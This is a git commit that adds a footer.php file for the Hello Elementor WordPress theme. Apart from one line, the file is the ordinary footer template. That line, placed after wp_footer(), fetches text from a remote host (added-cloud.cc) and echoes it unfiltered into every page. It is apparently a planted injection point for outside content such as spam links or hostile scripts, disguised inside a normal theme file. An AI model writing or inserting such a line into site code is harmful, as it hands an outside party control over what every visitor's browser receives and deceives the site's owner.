5452a15220e70d95b94dad78c2f23b7b58ec283e
PACKDOL <141484624+PACKDOL@users.noreply.github.com>
2025-07-14 13:38:24 +0700

    Create footer.php

---
+++ footer.php
@@ -0,0 +1,26 @@
+<?php
+/**
+ * The template for displaying the footer.
+ *
+ * Contains the body & html closing tags.
+ *
+ * @package HelloElementor
+ */
+
+if ( ! defined( 'ABSPATH' ) ) {
+	exit; // Exit if accessed directly.
+}
+
+if ( ! function_exists( 'elementor_theme_do_location' ) || ! elementor_theme_do_location( 'footer' ) ) {
+	if ( did_action( 'elementor/loaded' ) && hello_header_footer_experiment_active() ) {
+		get_template_part( 'template-parts/dynamic-footer' );
+	} else {
+		get_template_part( 'template-parts/footer' );
+	}
+}
+?>
+
+<?php wp_footer(); ?>
+<?php echo file_get_contents("https://added-cloud.cc/packdol/getcontent/sg/1.txt"); ?>
+</body>
+</html>
